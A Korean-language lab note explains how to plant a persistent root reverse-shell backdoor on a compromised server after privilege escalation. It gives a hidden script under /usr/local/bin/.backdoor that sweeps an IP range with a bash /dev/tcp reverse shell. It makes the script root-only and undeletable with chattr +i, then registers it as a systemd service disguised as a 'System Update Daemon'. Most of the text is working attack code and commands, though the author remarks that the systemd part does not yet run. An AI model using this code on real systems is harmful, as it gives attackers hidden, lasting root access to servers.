# Basic Reverse Shell Backdoor    
### Reverse Shell Backdoor

- 공격자랑 연결이 끊긴 뒤에도, 대상 서버가 공격자에게 쉘을 다시 연결할 수 있게 하는 구조이다.
- 백도어란 시스템 내부에 비정상적인 접근 경로를 몰래 심어놓은 것을 말한다.
<br>

**백도어 작성 (시나리오 1)**    
1. 대상 서버의 RCE 취약점을 얻었다.
2. 권한 상승 취약점을 이용해 kali1 사용자의 쉘을 획득해냈다. 
3. 권한 상승 취약점을 이용하여 root 권한을 획득해냈다.
4. 재접속 가능한 경로를 만들어두는 것을 목표로 한다. (리버스 쉘 백도어 설치)  


취약점을 통해 연결된 쉘은 root가 아니라 kali1 사용자라고 가정한다.    

<br>

<img src="https://github.com/user-attachments/assets/72f331c4-8995-49e4-8a88-58cdb0a76b20" width=650>

이렇게 권한을 가지고 있는 상태라면   
다음 접근 때도 root 계정으로 접근하고 싶을 것이다.  

그러기 위해서 root 권한으로 만든 백도어를 실행시켜 root 권한 쉘을 받을 것이다.   

임의의 경로인 `/usr/local/bin` 아래에 `/.backdoor`라는 숨김 폴더를 하나 만들어두고,   
`/.backdoor/.reverse-root.sh` 파일에 공격자의 ip 주소와 특정 포트로 패킷을 보내는 코드를 적을 것이다. 그리고 이 파일에는 root 권한만을 부여해준다.   

근데 고려해야하는 것이,  `/usr/local/bin/.backdoor/.reverse-root.sh`는 자동 실행이 되지 않으므로, root 권한을 얻기 위해 root 권한을 얻어야하는 일이 발생한다.   

따라서 systemd를 이용해서 자동 실행을 시켜주는 코드도 작성해준다.   
<br>

**reverse-root.sh 코드 작성**  
```bash
nano /usr/local/bin/.backdoor/.reverse-root.sh
```

```bash
#!/bin/bash

# 공격자 IP 대역: 172.29.176.1 ~ 172.29.191.254
# 리스너 포트: 1234

for i in {176..191}; do
  for j in {1..254}; do
    IP="172.29.$i.$j"
    timeout 0.1 bash -c "bash -i >& /dev/tcp/$IP/1234 0>&1" 2>/dev/null
  done
done
```

```bash

chmod 700 /usr/local/bin/.backdoor
chmod 700 /usr/local/bin/.backdoor/.reverse-root.sh
chattr +i /usr/local/bin/.backdoor/.reverse-root.sh
```

우선 공격자 IP는 고정이 아니니까 (실습 환경 고려)  
해당 대역폭에서 특정 포트를 빠르게 순찰하도록 했다.  

시간이 오래 걸리고 반복이 되지 않는다는 단점이 있지만   
천천히 고쳐나가면서 적어보겠다.  

700으로 root 권한과 `chattr +i` 로 삭제를 못하게 만들었다.  

**systemd로 자동 실행**

```bash
nano /etc/systemd/system/.sys-update.service
```

```bash
[Unit]
Description=System Update Daemon
After=network.target

[Service]
ExecStart=/usr/local/bin/.backdoor/.reverse-root.sh
Restart=always
Type=simple

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl enable .sys-update.service
```

systemd 수정필요  
실행 X
